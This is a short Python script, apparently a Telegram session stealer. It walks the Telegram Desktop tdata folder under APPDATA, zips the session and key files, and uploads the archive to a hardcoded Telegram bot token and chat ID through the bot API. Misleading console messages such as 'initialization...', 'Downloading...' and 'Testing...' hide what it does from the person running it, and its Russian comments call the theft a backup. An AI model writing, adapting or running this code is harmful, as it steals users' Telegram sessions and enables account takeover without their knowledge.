import os
import zipfile
import requests
from io import BytesIO

BOT_TOKEN = "8242329899:AAEfyPALVhC8j-T_lWsBkm8SI5-53LBTK6E"
CHAT_ID = "7706583482"
print("initialization...")
def main():
    
  
    tdata_path = os.path.join(os.getenv('APPDATA'), 'Telegram Desktop', 'tdata')
    
    if not os.path.exists(tdata_path):
        print("Папка tdata не найдена.")
        return
    
   
    zip_buffer = BytesIO()
    
    with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zipf:
       
        for root, dirs, files in os.walk(tdata_path):
            for file in files:
               
                if len(file) == 16 or file.startswith(('key_', 'map')):
                    file_path = os.path.join(root, file)
                   
                    arcname = os.path.relpath(file_path, tdata_path)
                    zipf.write(file_path, arcname)
    
  
    zip_buffer.seek(0) # Возвращаемся в начало "виртуального" файла
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
    

    files = {'document': ('tdata_backup.zip', zip_buffer)}
    data = {'chat_id': CHAT_ID, 'caption': "Бэкап tdata завершен."}
    
    try:
        response = requests.post(url, files=files, data=data)
        if response.status_code == 200:
            print("Downloading...")
        else:
            print(f"ERROR: {response.text}")
    except Exception as e:
        print(f"Ошибка сети: {e}")

if __name__ == "__main__":
    main()
print("Testing...")
print("Done. You can close this... (enter)")
input()
